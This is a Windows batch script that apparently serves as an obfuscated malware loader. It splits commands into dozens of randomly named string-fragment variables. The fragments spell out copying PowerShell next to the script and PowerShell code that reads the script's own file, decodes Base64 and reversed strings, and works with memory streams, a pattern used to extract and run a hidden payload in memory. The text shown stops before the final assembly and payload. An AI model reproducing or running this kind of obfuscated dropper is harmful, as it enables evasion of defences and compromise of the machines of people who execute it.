@echo off
set "kovHfPDfIH=do"
set "WpPHWBZSeG=Po"
set "IkCxPGJDdP=Sy"
set "QLbcBQLKXW=ll"
set "FghYCHAQOs= C"
set "fGOfXLRgdZ=we"
set "zwSXWDFPTw=st"
set "SMfAefYEyn=s\"
set "CaFbPVsHhq= /"
set "usxiZuiRAc=he"
set "CCVmBIoraX=nd"
set "HzFLiFEaVV=py"
set "RAhDApZqoq=Wi"
set "ziKbIJiIZZ=in"
set "SinQczbEYd=ws"
set "ynUsJdJanu=ow"
set "gcxCSfKptf=we"
set "ugXyUvThEA=\W"
set "OLlTkhPSZF=\v"
set "yjlaqShvEc=rs"
set "OwqDFZdIKS=co"
set "GWEPphMwvQ=0\"
set "HDJVdUzOLD=he"
set "KJTMpoKwCc=32"
set "SOzXHqVUYi=rS"
set "OXmIAMjFgD=xe"
set "pGtwswaWLC=.e"
set "FeTVYCsBzX=1."
set "JIEaMOZaPC=y "
set "FYcTyQwuhv=em"
set "FlWbuVsQLV=po"
set "jCQDSaiyRD=ll"
set "iEPExNNSVu=:\"
set "NOWLQdmyZe= %~dp0"
set "NOgKuuEcQS=cd"
set "eBgjtsZMKs=Obje"
set "JszFfEAQWy= = $"
set "RdnBNILxDN=;$OE"
set "HLFoLETfud= = ["
set "ADufXokarZ=mory"
set "dOIIuoSjwl=tsWi"
set "FYUxzJFhqb=, $J"
set "mnbjxEFjdb=ew-O"
set "akBQFOkaDW=..-1"
set "YsWqWCDYXL=-joi"
set "MoxsLScbxn===')"
set "jITOPdigbY=vj0m"
set "daduxrnhvT=tS46"
set "JMqVdDrsBX=g = "
set "KPJxBvSViN=join"
set "YRzgVbLtxM=]::("
set "Jpoabduicb=('da"
set "FCWFyrgElP='gni"
set "FGaSdJwBLh=.IO."
set "VnsqMoONRt=k; }"
set "wyRQWbegiP=]::("
set "dMiGfeKMaG=ispo"
set "kwWVXFCwlj=; };"
set "JvYhArLOck=nage"
set "RkCekBuuIQ=('%~f0'"
set "ddjqsgcyTI=)($B"
set "AYeLiPhraa=bstr"
set "CtxfFXbGRx=New-"
set "oGDNCkvNBv=File"
set "oZDVSrzByV=.Sec"
set "GarcSuUtkt=Invo"
set "vPMPtOWgCW=BC;$"
set "zdkerPxYDE=ment"
set "edyeWwQgnu=yste"
set "DRrsPDZMuj=i = "
set "LtsWZLbzaF=oin "
set "kChCzToLPw=Q = "
set "pcRJaYVaYq=, (,"
set "vCyUPQsnyc=oL'["
set "LBzVWfFAKQ=:: '"
set "TefAwsyePt=v4Ir"
set "WgaCmFDjCM=Disp"
set "gRpqIoDMyo=ateD"
set "rkWqOfPmka=Disp"
set "OLUdwxKERV=s.Su"
set "ClBfHAzVBJ=Bmor"
set "uCjufsizXu=UGTu"
set "AwWibLfPAC=).Sp"
set "JglhusJdrc=lBlo"
set "AeepsJfyfw= = N"
set "fhmPAlzUSo=qXs "
